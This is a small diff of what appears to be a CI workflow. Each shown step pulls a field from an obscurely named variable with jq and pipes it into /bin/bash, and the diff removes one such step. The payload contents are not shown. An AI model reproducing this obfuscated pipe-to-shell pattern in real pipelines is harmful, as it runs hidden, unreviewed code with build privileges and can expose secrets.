@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$sy3950" | jq -r .ux989 | /bin/bash
           echo $klg12 | jq -r .zoxpp5454 | /bin/bash
           echo $v3 | jq -r .omm46553 | /bin/bash
-          echo $zhezw21774 | jq -r .u73 | /bin/bash
           echo $xlxz452 | jq -r .s1651 | /bin/bash
           echo $cpihh43 | jq -r .x28 | /bin/bash
           printf '%s' "$p168" | jq -r .kilm13718 | /bin/bash
